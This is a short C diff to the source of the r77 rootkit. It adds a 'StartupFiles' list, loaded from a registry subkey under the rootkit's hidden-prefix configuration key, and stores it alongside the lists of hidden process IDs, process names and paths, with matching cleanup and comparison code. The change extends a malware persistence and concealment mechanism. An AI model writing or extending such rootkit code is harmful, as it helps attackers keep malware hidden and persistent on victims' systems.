@@ -933,6 +933,7 @@ VOID TerminateR77Service(DWORD excludedProcessId)
 PR77_CONFIG LoadR77Config()
 {
 	PR77_CONFIG config = new R77_CONFIG();
+	config->StartupFiles = CreateStringList(TRUE);
 	config->HiddenProcessIds = CreateIntegerList();
 	config->HiddenProcessNames = CreateStringList(TRUE);
 	config->HiddenPaths = CreateStringList(TRUE);
@@ -945,6 +946,14 @@ PR77_CONFIG LoadR77Config()
 	HKEY key;
 	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", 0, KEY_READ | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
 	{
+		// Read startup files "startup" subkey.
+		HKEY startupKey;
+		if (RegOpenKeyExW(key, L"startup", 0, KEY_READ, &startupKey) == ERROR_SUCCESS)
+		{
+			LoadStringListFromRegistryKey(config->StartupFiles, startupKey, MAX_PATH);
+			RegCloseKey(startupKey);
+		}
+
 		// Read process ID's from the "pid" subkey.
 		HKEY pidKey;
 		if (RegOpenKeyExW(key, L"pid", 0, KEY_READ, &pidKey) == ERROR_SUCCESS)
@@ -1008,6 +1017,7 @@ PR77_CONFIG LoadR77Config()
 }
 VOID DeleteR77Config(PR77_CONFIG config)
 {
+	DeleteStringList(config->StartupFiles);
 	DeleteIntegerList(config->HiddenProcessIds);
 	DeleteStringList(config->HiddenProcessNames);
 	DeleteStringList(config->HiddenPaths);
@@ -1031,6 +1041,7 @@ BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
 	else
 	{
 		return
+			CompareStringList(configA->StartupFiles, configB->StartupFiles) &&
 			CompareIntegerList(configA->HiddenProcessIds, configB->HiddenProcessIds) &&
 			CompareStringList(configA->HiddenProcessNames, configB->HiddenProcessNames) &&
 			CompareStringList(configA->HiddenPaths, configB->HiddenPaths) &&
